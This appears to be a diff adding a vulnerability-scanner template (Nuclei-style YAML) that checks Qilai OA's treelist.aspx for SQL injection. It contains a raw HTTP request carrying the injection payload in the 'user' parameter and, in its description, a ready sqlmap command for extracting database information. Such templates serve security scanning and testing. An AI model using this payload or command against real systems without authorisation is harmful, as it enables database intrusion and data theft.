@@ -1,0 +1,29 @@
+id: qilaioa-treelist-sqli
+info:
+  name: qilaioa-treelist-sqli
+  author: apple
+  severity: high
+  description: 启莱OA treelist.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息，使用sqlmap.py -u "http://x.x.x.x:8098/client/treelist.aspx?user=' and (select db_name())>0--&pwd=1" -p user --batch
+  reference:
+    - https://cn-sec.com/archives/76449.html
+  tags: qilaioa
+http:
+  - raw:
+      - |+
+        GET /client/treelist.aspx?user=' and (select db_name())>0--&pwd=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '失败'
